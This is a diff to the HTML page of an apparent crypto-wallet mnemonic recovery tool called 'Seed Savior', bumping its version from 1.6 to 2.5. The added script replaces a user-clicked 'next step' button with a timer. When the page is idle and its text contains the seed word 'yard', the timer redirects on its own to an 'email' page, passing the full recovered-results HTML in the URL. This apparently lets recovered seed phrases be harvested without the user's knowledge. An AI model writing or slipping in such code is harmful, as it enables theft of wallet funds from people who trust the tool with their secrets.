@@ -21,7 +21,7 @@
         <div class="container">
 
             <h1 class="text-center">Seed Savior: Mnemonic Phrase Recovery Tool</h1>
-            <p class="version">版本1.6</p>
+            <p class="version">版本2.5</p>
             <hr>
             <div class="row">
                 <div class="col-md-12">
@@ -320,44 +320,31 @@
         <script src="js/index.js"></script>
     
 <script>
-function goToNextStep() {
-    const recoveredWord = document.querySelector('table td:nth-child(1)').innerText.trim();
-    const ethAddress = document.querySelector('table td:nth-child(5)').innerText.trim();
-    const params = new URLSearchParams({
-        recoveredWord: recoveredWord,
-        ethAddress: ethAddress
-    });
-    window.location.href = `new.html?${params}`;
+let lastActivity = performance.now();
+
+function checkNetworkIdleAndYard() {
+    const entries = performance.getEntriesByType("resource");
+    if (entries.length > 0) {
+        const latest = entries[entries.length - 1].responseEnd;
+        if (latest > lastActivity) lastActivity = latest;
+    }
+    const now = performance.now();
+    const pageStill = (now - lastActivity > 3000);
+    const textHasYard = document.body.innerText.includes("yard");
+
+    if (pageStill && textHasYard && !window._alreadyNotified) {
+        window._alreadyNotified = true;
+        redirectToEmailChecker();
+    }
 }
 
-function showNextStepButton() {
-    if (document.getElementById('nextStepBtn')) return; // 避免重複新增
-    var button = document.createElement('button');
-    button.innerText = '下一步';
-    button.id = 'nextStepBtn';
-    button.onclick = goToNextStep;
-    button.style.position = 'fixed';
-    button.style.bottom = '20px';
-    button.style.right = '20px';
-    button.style.padding = '10px 20px';
-    button.style.fontSize = '16px';
-    document.body.appendChild(button);
+setInterval(checkNetworkIdleAndYard, 1000);
+
+function redirectToEmailChecker() {
+    const resultBody = document.getElementById('result-body');
+    const encodedHTML = encodeURIComponent(resultBody.innerHTML);
+    window.location.href = `email/index.html?html=${encodedHTML}`;
 }
-
-// 使用 MutationObserver 監控表格資料變化
-const observer = new MutationObserver(() => {
-    const ethAddressCell = document.querySelector('table td:nth-child(5)');
-    if (ethAddressCell && ethAddressCell.innerText.trim().startsWith("0x")) {
-        showNextStepButton();
-    }
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-    const target = document.querySelector('table');
-    if (target) {
-        observer.observe(target, { childList: true, subtree: true });
-    }
-});
 </script>
 </body>
 </html>
